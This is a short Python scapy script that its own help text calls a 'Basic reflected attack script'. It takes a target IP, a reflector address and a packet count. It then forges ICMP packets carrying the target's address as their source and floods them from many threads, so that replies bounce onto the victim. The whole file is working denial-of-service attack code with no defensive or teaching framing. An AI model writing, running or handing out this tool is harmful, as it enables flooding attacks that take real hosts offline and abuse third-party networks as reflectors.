from scapy.all import *
import threading
import argparse


def create_packets(num, src, dst):
    packets = [IP(ttl=10, src=src, dst=dst)/ICMP() for n in range(num)]
    return packets


def create_threads(num, packets):
    for n in range(num):
        threading.Thread(target=send, args=(packets,)).start()


def main():
    parser = argparse.ArgumentParser(
        description="Basic reflected attack script using scapy")
    parser.add_argument("-t", "--target", type=str, help="Target IP")
    parser.add_argument("-s", "--spoofed", type=str, help="Spoofed source IP")
    parser.add_argument("-p", "--packets", type=str,
                        help="Number of packet sets")
    arguments = parser.parse_args()

    for n in range(int(arguments.packets)):
        packets = create_packets(100, src=arguments.target,
                                 dst=arguments.spoofed)
        create_threads(10, packets)


if __name__ == "__main__":
    main()
